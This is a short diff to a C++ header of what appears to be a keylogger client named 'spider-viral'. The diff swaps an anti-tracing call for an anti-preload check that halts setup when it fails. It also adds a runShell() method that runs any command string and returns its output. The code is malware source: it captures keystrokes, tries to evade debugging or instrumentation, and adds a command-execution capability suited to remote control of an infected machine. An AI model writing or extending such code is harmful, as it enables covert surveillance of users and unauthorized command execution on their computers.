@@ -11,6 +11,7 @@
 #ifndef SPIDER_CLIENT_VIRAL_HPP
 #define SPIDER_CLIENT_VIRAL_HPP
 
+#include <boost/process.hpp>
 #include <KeyLogger/KeyLogger.hpp>
 #include "Configuration.hpp"
 
@@ -46,12 +47,32 @@ namespace spi
             _keylogger->run();
         }
 
-        void setup(KeyLogger *keylogger) noexcept
+        bool setup(KeyLogger *keylogger) noexcept
         {
-            antiTrace();
+            if (!antiPreload())
+                return false;
             _keylogger = keylogger;
-            _log(logging::Info) << " Successfully initialized" << std::endl;
+            _log(logging::Info) << "Successfully initialized" << std::endl;
+            return true;
         }
+
+        std::string runShell(const std::string &cmd) noexcept
+        {
+            namespace bp = boost::process;
+            bp::ipstream is;
+            bp::child c(cmd, bp::std_out > is);
+
+            std::stringstream ss;
+            std::string line;
+
+            while (c.running() && std::getline(is, line) && !line.empty()) {
+                ss << line << "\n";
+            }
+
+            c.wait();
+            return ss.str();
+        }
+
 
     private:
         logging::Logger _log{"spider-viral", logging::Level::Debug};
